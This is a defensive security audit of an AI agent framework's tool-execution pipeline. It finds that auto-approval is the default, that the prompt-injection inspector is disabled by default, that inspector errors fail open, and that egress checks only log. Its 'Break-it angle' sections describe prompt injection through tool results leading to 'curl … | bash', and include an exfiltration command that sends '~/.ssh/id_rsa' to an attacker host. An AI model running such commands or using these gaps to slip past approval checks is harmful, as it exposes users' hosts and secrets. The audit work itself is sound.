# Audit Lens — Dataflow / Pipeline Graph

Lens: `audit-dataflow-pipeline-graph` (end-to-end initiation→output pipeline
extraction + high-risk branch expansion). Scope authority: **audit-only /
read-only** per `docs/cloud/00-orientation.md`. This report builds on that
orientation; it does not re-derive the surface inventory.

Finding ID prefix: `PGR-GSL-NNN`. Confidence/evidence discipline per
`evidence_discipline.md`; every Confirmed carries a quoted `file:line`.

---

## 1. Summary

The central agent pipeline is **user input → context assembly → provider stream →
model-response parse → tool categorize → inspection/permission gate → tool dispatch
(MCP/shell/frontend/subagent) → tool result reinjected into conversation → loop →
terminal output**, all inside one `try_stream!` in `Agent::reply_internal`
(`crates/gosling/src/agents/agent.rs:1914-2726`).

The pipeline is structurally sound for the happy path and for several hostile-input
sub-cases (duplicate tool-call ids, unparseable tool calls, missing permission
inspector, provider errors) — these are held and listed as non-findings. The
**material weakness is the permission-gate branch under default configuration**:
the default agent mode is `Auto` (auto-approve every tool call), and the only
inspector that can escalate an auto-approved call to human approval — the
prompt-injection SecurityInspector — is **disabled by default**. The EgressInspector
(the nominal data-exfiltration control) is **observe-only** and never gates. Inspector
errors are **swallowed and fail open**. Net: in the default posture, a tool call
emitted by the model (including one induced by prompt injection embedded in an earlier
tool result) reaches shell/MCP execution with no code-level gate.

These mechanisms are Confirmed at the code level. The one calibration caveat is that
the CLI/desktop onboarding flows may set a stricter persisted mode; I did not trace
those writers (Validation Limits §9), so the "default in practice is Auto" claim is
scored Likely while the code-default mechanism is Confirmed.

---

## 2. Pipeline graph

### 2.1 ASCII graph (turn lifecycle)

```
                          ┌─────────────────────────────────────────────────────────┐
 user_message ──▶ Agent::reply (agent.rs:1402)                                        │
   │  - elicitation-response short-circuit (1414-1448)                                │
   │  - SessionStart / UserPromptSubmit hooks (1460-1477)                             │
   │  - slash-command execute_command (1479-1493)                                     │
   ▼                                                                                  │
 reply_internal (1829)                                                                │
   │                                                                                  │
   ├─ prepare_reply_context (653): fix_conversation, tools+prompt, gosling_mode (676) │
   ├─ load_project_instructions → system_prompt addendum (1853-1856)                  │
   ├─ provider() + fetch_model_info (1858-1870)                                       │
   │                                                                                  │
   ▼   ╔══════════════════════ TURN LOOP (1931) ══════════════════════╗              │
   │   ║ drain_pending_steers (1936)                                   ║              │
   │   ║ max_turns guard (1963-1967)                                   ║              │
   │   ║ proactive compaction check (1974-2025) ──err──▶ break         ║              │
   │   ║ inject_moim (2027)                                            ║              │
   │   ║ apply_context_manager (2035 → 1702) ──build err──▶ fallback   ║              │
   │   ║      = CONTEXT ASSEMBLY (packet / truncation / memory)        ║              │
   │   ║ stream_response_from_provider (2047 → reply_parts.rs:256)     ║              │
   │   ║      = PROVIDER REQUEST + STREAM                              ║              │
   │   ║                                                              ║              │
   │   ║   while stream.next() (2088):                                ║              │
   │   ║     Ok(response,usage) ─▶ update_session_metrics (2098)      ║              │
   │   ║        categorize_tools (2108 → reply_parts.rs:379)          ║              │
   │   ║          = MODEL-RESPONSE PARSE (coerce args, dedup ids)     ║              │
   │   ║        yield filtered_response to UI (2136)                  ║              │
   │   ║        if 0 tool reqs ─▶ accumulate text, continue (2140)    ║              │
   │   ║        ┌ frontend_requests ─▶ handle_frontend_tool (2159)    ║              │
   │   ║        ├ Chat mode ─▶ skip w/ CHAT_MODE_TOOL_SKIPPED (2168)  ║              │
   │   ║        └ else:                                               ║              │
   │   ║            inspect_tools (2187 → tool_inspection.rs:75)      ║              │
   │   ║              = SECURITY→EGRESS→ADVERSARY→PERMISSION→REPETITION║              │
   │   ║            process_inspection_results_w_perm (2196)          ║              │
   │   ║              = PERMISSION GATE (approved/needs_appr/denied)  ║              │
   │   ║            handle_approved_and_denied_tools (2221 → 730)     ║              │
   │   ║              ├ approved ─▶ dispatch_tool_call (960)          ║              │
   │   ║              └ denied   ─▶ DECLINED_RESPONSE (777)           ║              │
   │   ║            handle_approval_tool_requests (2229 → tool_exec.rs)║             │
   │   ║              = HUMAN CONFIRM via ToolConfirmationRouter      ║              │
   │   ║              on Allow ─▶ dispatch_tool_call (135)            ║              │
   │   ║            select_all(tool_futures) drain loop (2250-2313)   ║              │
   │   ║              ActionRequired ─▶ persist+yield (2265)          ║              │
   │   ║              Result ─▶ add_tool_response_with_metadata (2297)║              │
   │   ║                = TOOL RESULT REINJECTED INTO CONVERSATION    ║              │
   │   ║        build request_msg + final_response, push to           ║              │
   │   ║          messages_to_add (2372-2438)                         ║              │
   │   ║     Err(ContextLengthExceeded) ─▶ recovery compact (2446)   ║              │
   │   ║     Err(CreditsExhausted/Refusal/Network/other) ─▶ notify+brk║             │
   │   ║                                                              ║              │
   │   ║ tools_updated ─▶ prepare_tools_and_prompt (2562)            ║              │
   │   ║ subdir hints (2567) ; goal/grind nudge (2588-2629)          ║              │
   │   ║ tool_pair summaries applied (2639-2668)                     ║              │
   │   ║ persist messages_to_add ─▶ session_manager.add_message(2680)║              │
   │   ║ conversation.extend (2683)                                  ║              │
   │   ║ exit_chat ─▶ Stop hook (2689-2714)                          ║              │
   │   ╚═══════════════ loop or break ═══════════════════════════════╝              │
   ▼                                                                                  │
 Stop hook emit (2723-2725) ─▶ terminal: BoxStream<AgentEvent> to CLI/UI/server ─────┘
```

### 2.2 Node table

| Node ID | File:fn | Stage Type | Inputs | Outputs | Side effects | Branches | Terminal? |
|---|---|---|---|---|---|---|---|
| N1 | `agent.rs:1402 reply` | entrypoint | user Message, SessionConfig | AgentEvent stream | hooks, session writes | elicitation / slash-cmd / normal | no |
| N2 | `agent.rs:653 prepare_reply_context` | validation | conversation | ReplyContext (tools, prompt, mode) | fix_conversation | mode==SmartApprove annotate | no |
| N3 | `agent.rs:1702 apply_context_manager` | contract/assembly | prompt, conversation, model_config | (system_prompt, messages) | memory retrieval, summarizer spawn | Off/Shadow/On, self-managing cap, build-err fallback | no |
| N4 | `reply_parts.rs:256 stream_response_from_provider` | adapter | prompt, msgs, tools | MessageStream | network (provider) | toolshim vs raw; stream-create err | no |
| N5 | `reply_parts.rs:379 categorize_tool_requests` | routing | provider Message, tools | frontend/other reqs, filtered msg | none | frontend vs other; dup-id dedup; parse Ok/Err | no |
| N6 | `tool_inspection.rs:75 inspect_tools` | policy | reqs, messages, mode | InspectionResult[] | LLM calls (adversary / smart-detect) | per-inspector; **err swallowed** | no |
| N7 | `permission_inspector.rs:65 process_inspection_results` | policy/decision | reqs, results | PermissionCheckResult | none | approved/needs_approval/denied | no |
| N8 | `agent.rs:730 handle_approved_and_denied_tools` | routing | perm result | tool_futures | dispatch | approved→dispatch; denied→DECLINED | no |
| N9 | `tool_execution.rs:81 handle_approval_tool_requests` | decision/gate | needs_approval | tool_futures | ActionRequired msg, perm-store update | Allow/AlwaysAllow vs Deny/AlwaysDeny | no |
| N10 | `agent.rs:960 dispatch_tool_call` | capability | tool_call | ToolCallResult | PreToolUse hook, subprocess/shell/MCP | frontend vs extension; hook deny | no |
| N11 | `extension_manager.rs:1767 dispatch_tool_call` | adapter | ctx, tool_call | ToolCallResult | MCP subprocess call | tool-available check; ServiceError map | no |
| N12 | `agent.rs:2274-2299 result drain` | persistence | ToolStreamItem | conversation msgs | session writes, notifications | Result/ActionRequired/Message | no |
| N13 | `agent.rs:2680-2683 persist` | persistence | messages_to_add | session store, conversation | session_manager.add_message | inference-tag branch | no |
| N14 | `agent.rs:2723 emit_stop_hook` | trace/product | last_assistant_text | Stop hook, span trace_output | hook | handled-for-exit vs not | **yes** |

### 2.3 Edge table (load-bearing edges)

| Edge | From→To | Condition | Data passed | Side effect |
|---|---|---|---|---|
| E1 | N5→N6 | non-Chat, tool reqs>0 | `remaining_requests` | — |
| E2 | N6→N7 | permission inspector present | `inspection_results` | — |
| E3 | N7→N8 | approved non-empty | `approved` reqs | dispatch |
| E4 | N7→N9 | needs_approval non-empty | `needs_approval` + `inspection_results` | ActionRequired to UI |
| E5 | N9→N10 | confirmation ∈ {AllowOnce, AlwaysAllow} | tool_call | subprocess exec |
| E6 | N10→N11 | not frontend tool | CallToolRequestParams | MCP call |
| E7 | N11→N12 | future resolves | CallToolResult | conversation write |
| E8 | N12→N13 | loop end | messages_to_add | durable session write |
| E9 | N6→(drop) | inspector returns `Err` | none (result discarded) | **fail-open, see PGR-GSL-002** |
| E10 | N7 fallback | no permission inspector | all→needs_approval | fail-closed (held) |

---

## 3. Path inventory

Candidate initiation→product paths enumerated: **11**. Equivalent clusters collapsed
to the branch classes below.

| Path | Entry | Branch class | Terminal | Risk | Existing tests |
|---|---|---|---|---|---|
| P-A | reply→…→dispatch | canonical success (Auto approve, tool runs, result reinjected, loop, Stop) | assistant text | P1 | partial (router, inspector unit tests) |
| P-B | reply→…→needs_approval→confirm | human-approval branch | tool runs or DECLINED | P0 | `tool_confirmation_router` tests |
| P-C | reply→…→inspect Deny / hook Deny | rejection / fail-closed | DECLINED / policy-deny msg | P0 | `tool_inspection` deny test |
| P-D | Chat mode | tool skipped, plan emitted | text plan | P2 | none seen |
| P-E | provider Err (ctx-len) | recovery compaction | continue / abort | P1 | none seen in this lens |
| P-F | provider Err (refusal/credits/network) | terminal notify | notification, break | P2 | none seen |
| P-G | frontend tool | round-trips to UI channel | tool response | P2 | none seen |
| P-H | unparseable tool call | placeholder + parse-error feedback | corrected retry | P2 | `categorize_tool_requests` tests |
| P-I | duplicate tool-call ids | dedup, first wins | single exec | P1 | `..._dedups_duplicate_ids...` test |
| P-J | inspector Err under Auto | **fail-open auto-exec** | tool runs ungated | P0 | none |
| P-K | egress destination in shell/web arg | LOG only, allowed | tool runs | P1 | `extract_destinations` unit test |

High-risk selected for branch expansion (Gate 3): **P-B, P-C, P-J, P-K** plus the
permission-gate default posture spanning P-A/P-J.

---

## 4. Branch analysis (Gate 4) & findings

### PGR-GSL-001: Default agent mode auto-approves every tool call; the only escalating inspector is off by default

Severity: High
Confidence: Confirmed (code-default mechanism) / Likely (that Auto is the effective runtime default)
Evidence basis: source-evidenced
Domain: State-Transition / Security-adjacent (permission-gate branch)

Evidence:
- `crates/gosling-providers/src/gosling_mode.rs:24-27` — `pub enum GoslingMode { #[default] … Auto, "Automatically approve tool calls" }`.
- `crates/gosling/src/agents/agent.rs:314` — `config.get_gosling_mode().unwrap_or_default()` (absent config ⇒ `Auto`).
- `crates/gosling/src/permission/permission_inspector.rs:151-153` — `GoslingMode::Auto => InspectionAction::Allow` for every tool.
- `crates/gosling/src/security/mod.rs:46-55` — `is_prompt_injection_detection_enabled()` returns `config.get_param::<bool>("SECURITY_PROMPT_ENABLED").unwrap_or(false)`.
- `crates/gosling/src/security/security_inspector.rs:84-88` — inspector `is_enabled()` gated on that flag; when false it is skipped entirely (`tool_inspection.rs:85-87`).

Observed behavior:
- With no explicit `GOSLING_MODE` and no `SECURITY_PROMPT_ENABLED`, the permission inspector marks all model-emitted tool calls `Allow` and the SecurityInspector is disabled, so `process_inspection_results` yields them all as `approved`. They flow straight to `dispatch_tool_call` (`agent.rs:740-749`, `2221`).

Expected boundary:
- A code-level gate in front of destructive/irreversible tool calls (shell, file write, MCP) as the orientation §5 names the permission/confirmation layer the primary boundary.

Failure mechanism:
- Auto mode delegates the entire gate to the inspector overrides; the one override capable of forcing approval on an arbitrary command is opt-in and off by default. Egress/permission provide no substitute (see PGR-GSL-003).

Break-it angle:
- A tool result from a semi-trusted MCP/web fetch (orientation §4 "untrusted") contains an injected instruction; the model emits `shell{curl … | bash}`; in default posture it executes with no prompt.

Impact:
- Model- or injection-driven tool calls execute on the user's workstation with no confirmation. Blast radius = Local host.

Operational impact:
- Blast radius: Workflow→Service (host). Side-effect class: process / file / network. Reversibility: irreversible. Operator visibility: UI-visible (tool runs shown) but no pre-exec gate. Rerun safety: unsafe.

Adjacent failure modes: PGR-GSL-002 (fail-open on inspector error), PGR-GSL-003 (egress not enforced).

Recommended mitigation:
- Minimal repair: make the effective default `SmartApprove` (or require SecurityInspector-on when mode is Auto) so unknown/write tools default to approval.
- Behavior test: with empty config, assert a `shell` write tool lands in `needs_approval`, not `approved`.

Implementation assessment: Complexity: governance_decision. Cost: S. Cost drivers: default-policy change + onboarding + tests. Nominal agent: human-owner (product-policy default).

Validation: config-absent integration test over `reply_internal` asserting the permission-gate terminal state for a destructive tool.

Non-goals: redesigning the inspector stack.

---

### PGR-GSL-002: Tool-inspector errors are swallowed — inspection fails open

Severity: High
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe / Input-Output-Path

Evidence:
- `crates/gosling/src/tool_inspection.rs:95-116` — on `inspect(...)` returning `Err`, the manager logs `tracing::error!` and the comment `// Continue with other inspectors even if one fails`; no result is recorded for the affected requests.
- Consumed at `agent.rs:2187-2209`: results feed `process_inspection_results`; a request with no security/permission result and Auto baseline stays `approved`.

Observed behavior:
- If the SecurityInspector, EgressInspector, or AdversaryInspector errors (e.g. the adversary/ML classifier network call fails, `security_inspector.rs:66-69` propagates `?`), that inspector contributes zero `InspectionResult`s and the loop proceeds.

Expected boundary:
- A security control that errors should fail closed (force approval/deny), not vanish.

Failure mechanism:
- The manager treats an inspector error identically to "inspector had nothing to say." Under Auto baseline (PGR-GSL-001) the missing escalation means auto-approve.

Break-it angle:
- Induce a classifier/LLM error (network blip, rate limit) precisely on the turn that carries an injected command; the gate silently disappears for that turn.

Impact:
- Transient inspector failure ⇒ ungated tool execution. Blast radius: Local host. Reversibility: irreversible. Operator visibility: log-only (error trace, no UI signal). Rerun safety: unsafe.

Adjacent failure modes: PGR-GSL-001.

Recommended mitigation:
- Local guardrail: on inspector `Err`, synthesize a `RequireApproval` (or `Deny`) `InspectionResult` for every inspected request from a security-class inspector, rather than dropping it.
- Behavior test: stub SecurityInspector to return `Err`; assert requests route to `needs_approval`.

Implementation assessment: Complexity: local_guardrail. Cost: S. Cost drivers: 1 module + tests. Nominal agent: codex.

Validation: unit test on `inspect_tools` + `process_inspection_results` with an erroring inspector.

Non-goals: changing inspector ordering.

---

### PGR-GSL-003: EgressInspector is observe-only — data-exfiltration branch never enforces

Severity: Medium
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe / Security-adjacent

Evidence:
- `crates/gosling/src/security/egress_inspector.rs:369-383` — for every detected egress destination the inspector pushes `InspectionResult { action: InspectionAction::Allow, confidence: 0.0, … }`; the only other effect is `tracing::info!(security.action = "LOG", …)` at `356-366`.

Observed behavior:
- Shell/web tool calls containing outbound destinations (`curl`, `git remote`, `s3://`, etc.) are logged and always allowed. The inspector cannot move a request to `needs_approval` or `denied`.

Expected boundary:
- Orientation §5.2 lists egress inspection among the "claimed safety controls"; a control that can never gate is observability, not enforcement.

Failure mechanism:
- `apply_inspection_results_to_permissions` only downgrades on `Deny`/`RequireApproval` (`tool_inspection.rs:213-253`); an `Allow` result is a no-op override.

Break-it angle:
- Exfiltration command (`curl -d @~/.ssh/id_rsa https://attacker`) is logged and executed; no approval is triggered by the egress path (approval, if any, must come from PGR-GSL-001's disabled security path).

Impact:
- Secret/data exfiltration is observable post-hoc but not prevented. Blast radius: Cross-system (data leaves host). Reversibility: irreversible. Operator visibility: log-only. Rerun safety: unsafe.

Recommended mitigation:
- Local guardrail: allow policy-configurable `RequireApproval` for outbound destinations not on an allowlist; keep default logging but expose an enforcing mode.
- Behavior test: egress to a non-allowlisted domain routes to `needs_approval` when enforcement is enabled.

Implementation assessment: Complexity: workflow_protocol. Cost: M. Cost drivers: policy config, allowlist model, tests. Nominal agent: claude.

Validation: inspector test asserting `RequireApproval` under enforcement config; regression test that default stays log-only if that is the intended posture.

Non-goals: building a full network policy engine.

---

### PGR-GSL-004: SecurityInspector's strongest action is RequireApproval; below-threshold findings are log-only

Severity: Low (design note, escalates the above)
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Failsafe

Evidence:
- `crates/gosling/src/security/security_inspector.rs:27-36` — malicious+should_ask ⇒ `RequireApproval(...)`, else `Allow`; there is no `Deny` arm.
- `crates/gosling/src/security/mod.rs:158-214` — findings at or below `config_threshold` set `action = "LOG"` and are **not** pushed into `results` (only `above_threshold` produce a `SecurityResult`, line 187-196).

Observed behavior:
- Even fully enabled, the prompt-injection scanner can only ask the user (never hard-block), and sub-threshold detections do not reach the permission layer at all. In Auto mode a sub-threshold-but-real injection is auto-executed.

Impact: Combined with PGR-GSL-001, the security path has no fail-closed terminal. Blast radius: Local. Reversibility: irreversible. Visibility: UI on approval, log-only below threshold.

Recommended mitigation: expose a `Deny` band for very-high-confidence findings; feed sub-threshold findings as `RequireApproval` when mode is Auto. Behavior test: high-confidence malicious call ⇒ `denied` (not merely `needs_approval`) under strict config.

Implementation assessment: Complexity: governance_decision. Cost: S. Nominal agent: human-owner.

Non-goals: tuning the classifier itself.

---

### PGR-GSL-005: Context assembly silently disabled by default; failure falls back to raw conversation

Severity: Low (correctness/observability note)
Confidence: Confirmed
Evidence basis: source-evidenced
Domain: Data-Integrity / Reliability

Evidence:
- `crates/gosling/src/context_mgmt/policy.rs:4-8` — `#[default] Off` ("the Context Manager never runs").
- `crates/gosling/src/context_mgmt/summarizer/mod.rs:36-39` — summarizer `#[default] Off`.
- `crates/gosling/src/agents/agent.rs:1720-1722` — `if mode == Off { return fallback() }` returns the merged prompt + raw messages.
- `agent.rs:1794-1798` — on `ContextManager::build` error: `warn!` + `fallback()` (raw conversation, no packet).

Observed behavior:
- By default no truncation/summarization/memory-retrieval runs; the pipeline relies entirely on the provider's `ContextLengthExceeded` error and the recovery-compaction branch (`agent.rs:2446-2497`) to bound growth. A context-manager build error is a silent (`warn`-only) downgrade to the same raw path.

Impact:
- Not a data-loss defect (conversation is preserved), but the "context assembly" stage is inert by default, so the stated context-management stage is effectively the naive path unless opted in. Operator sees only a debug/warn line. Blast radius: Workflow. Reversibility: reversible. Rerun safety: safe.

Recommended mitigation: surface a one-time UI/log signal when context-manager build fails mid-session (distinguish "Off by config" from "failed and fell back"). Behavior test: forced build error asserts an operator-visible event, not just `warn!`.

Implementation assessment: Complexity: operator_ux. Cost: XS. Nominal agent: codex.

Non-goals: enabling the Context Manager by default.

---

## 5. Branch coverage / expansion ledger

| Decision node | Branch A (tested-by-reasoning) | Branch B | Covered | Deferred |
|---|---|---|---|---|
| N7 mode | Auto→Allow (PGR-001) | Approve→RequireApproval | both read | SmartApprove LLM-detect path only skimmed |
| N7 no-inspector fallback | present→baseline | absent→all needs_approval (held) | both | — |
| N6 inspector result | Ok→applied | Err→dropped (PGR-002) | both | ML/adversary internals |
| N9 confirmation | Allow→dispatch | Deny→DECLINED | both read | timeout/channel-closed path (partially, tool_exec.rs:115-116) |
| N10 hook | allow→run | Deny→policy-deny error (held) | both | — |
| N5 parse | Ok→coerce | Err→placeholder+error feedback (held) | both | coerce_tool_arguments internals |
| N4 stream | raw | toolshim accumulate (reply_parts.rs:317-363) | both read | toolshim_postprocess internals |
| Egress | Allow-only (PGR-003) | (no B exists) | full | — |

Deferred branches (cap-respecting; none executed live):

| Deferred Branch | Reason | Risk | Follow-up |
|---|---|---|---|
| Subagent pipeline (`subagent_handler.rs`, `subagent_execution_tool/`) | out of central-loop scope, effort cap | P1 | dedicated pass: does subagent tool dispatch reuse the same gate? |
| AdversaryInspector LLM path (`adversary_inspector.rs`) | not deep-read | P2 | verify its error mode vs PGR-002 |
| `scanner.rs` pattern/ML detection quality | detection-quality, not pipeline-shape | P1 | security-llm lens owns this |
| `large_response_handler.rs` result-size handling on reinjection | not read | P2 | verify oversized MCP result truncation into context |
| CLI/desktop onboarding mode writers | outside crate scope | P0 (calibrates PGR-001) | confirm effective default mode set at first run |

---

## 6. Invariants asserted (Gate 6)

Checked against the pipeline (reasoned, not executed):

1. Every accepted tool call has a conversation trace — HELD (`agent.rs:2297-2299`, `2372-2438` push request+response; persisted `2680-2683`).
2. Every rejected/denied call fails closed with `DECLINED_RESPONSE` — HELD (`agent.rs:777-791`, `tool_execution.rs:155-169`).
3. Terminal state valid — HELD (loop always breaks to Stop hook / span record `2719-2725`).
4. Duplicate tool-call ids do not double-execute — HELD (`reply_parts.rs:434-438`).
5. Unparseable tool call cannot masquerade as success — HELD (`agent.rs:2168-2184` Chat skip guarded by `is_err`; `2388-2429` parse error fed back).
6. Missing permission inspector fails closed — HELD (`agent.rs:2201-2209` → all `needs_approval`).
7. Policy-hook deny blocks execution and is non-retry-labeled — HELD (`agent.rs:987-1003`).
8. Inspector failure fails closed — **VIOLATED** (PGR-GSL-002).
9. Default posture gates destructive tools — **VIOLATED** (PGR-GSL-001).
10. Egress control can prevent exfiltration — **VIOLATED** (PGR-GSL-003, observe-only).
11. Provider errors are surfaced, not swallowed — HELD (`agent.rs:2446-2557` each arm yields a user-visible message).
12. Final output traceable to initiation — HELD (span `trace_input`/`trace_output`, `agent.rs:1411-1412`, `2720`).

---

## 7. Non-findings (seams checked and held)

- **ToolConfirmationRouter** correctly prunes stale senders on register, handles out-of-order and cancelled-receiver deliveries — `tool_confirmation_router.rs:19-45` + tests `61-143`.
- **MCP dispatch** checks tool availability before call, maps `ServiceError::McpError` to structured `ErrorData`, and strips untrusted MCP-app meta from results before reinjection — `extension_manager.rs:1776-1791`, `1840-1849` (`remove_untrusted_mcp_app_meta`), trusted-meta only hydrated on non-error `1851-1862`.
- **Tool-result reinjection** matches results to requests by id and writes into the paired user message with provider metadata — `agent.rs:2297-2299`; unmatched ids are dropped silently (minor, not material).
- **dispatch_tool_call error path** downcasts to `ErrorData` and never panics; tool errors become `CallToolResult::error` in history — `agent.rs:1044-1054`.
- **Frontend tool** requests round-trip through a dedicated channel and cannot be dispatched as extension tools — `agent.rs:1029-1034`, `is_frontend_tool` guard.
- **Context-manager build failure** degrades to raw conversation without crashing the turn — `agent.rs:1794-1798` (see PGR-GSL-005 for the observability caveat).
- **Refusal is terminal** — sets `exit_chat` to avoid resending a refused conversation — `agent.rs:2522-2534`.

---

## 8. Randomization note (Gate 3/5)

This lens is **static/simulation-reasoned only** (audit-only authority; no build/run
permitted in scope). No randomized executable harness was implemented, so no seed,
input hashes, or replay command are recorded. The path selection above is deliberate
(P-B/P-C/P-J/P-K + default-posture), not weighted-random. Recommended next slice
(below) would add the executable randomized harness.

---

## 9. Validation limits (what was NOT reviewed / proven)

- **Nothing was executed.** All findings are `source-evidenced` / `simulation-reasoned`; no `cargo build`, `cargo test`, or live run was performed (read-only authority).
- **Effective runtime default mode not traced.** The enum default and `unwrap_or_default()` are Confirmed, but the CLI (`crates/gosling-cli`) and desktop (`ui/desktop`) onboarding may persist a stricter `GOSLING_MODE` at first run; I did not read those writers. PGR-GSL-001's "Auto in practice" is therefore Likely, not Confirmed.
- **Subagent pipeline** (`subagent_handler.rs`, `subagent_execution_tool/`) not audited — whether subagent tool dispatch reuses the same inspection gate is unverified.
- **AdversaryInspector, RepetitionInspector, scanner.rs internals** not deep-read; their individual error modes vs PGR-GSL-002 are unconfirmed.
- **`large_response_handler.rs`** (MCP result size handling before reinjection) not reviewed.
- **`coerce_tool_arguments`, `toolshim_postprocess`, `fix_conversation`** internals treated as black boxes (their call sites are held; their logic is not).
- **Persistence integrity** of `session_manager.add_message` (ordering, partial-write, crash mid-turn) is owned by the state-transition / integrity lenses, not proven here.
- Provider-side streaming correctness (partial chunk handling inside each provider impl) not examined; only the agent-side stream consumer (`reply_parts.rs:316-372`) was read.

---

## 10. Next recommended slice

1. Build an executable pipeline harness (Gate 7) over `reply_internal` with a stub provider that emits scripted tool calls, asserting the permission-gate terminal state per mode × inspector-config matrix — directly proves/refutes PGR-GSL-001/002/004.
2. Confirm the CLI/desktop first-run default mode to finalize PGR-GSL-001 severity.
3. Extend the harness with an erroring-inspector stub (PGR-GSL-002) and an egress-destination fuzz set (PGR-GSL-003).
